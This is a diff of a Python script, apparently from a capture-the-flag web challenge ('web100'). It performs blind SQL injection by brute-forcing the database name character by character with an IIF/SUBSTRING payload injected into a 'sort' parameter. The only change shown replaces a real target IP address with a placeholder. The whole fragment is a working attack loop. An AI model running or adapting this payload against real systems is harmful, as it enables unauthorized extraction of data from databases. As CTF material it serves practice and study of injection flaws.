@@ -4,7 +4,7 @@ arr = string.ascii_letters+string.digits+string.punctuation
 
 def bind(flag):
     for i in arr:
-        res = requests.get(f'''http://167.172.85.253/web100/?sort=1|IIF(SUBSTRING(DB_NAME(),1,{len(flag)+1})='{flag+i}','B',2)''').text
+        res = requests.get(f'''http://xxx.xxx.xxx.xxx/web100/?sort=1|IIF(SUBSTRING(DB_NAME(),1,{len(flag)+1})='{flag+i}','B',2)''').text
         time.sleep(0.5)
         if 'Error' in res:
             return i
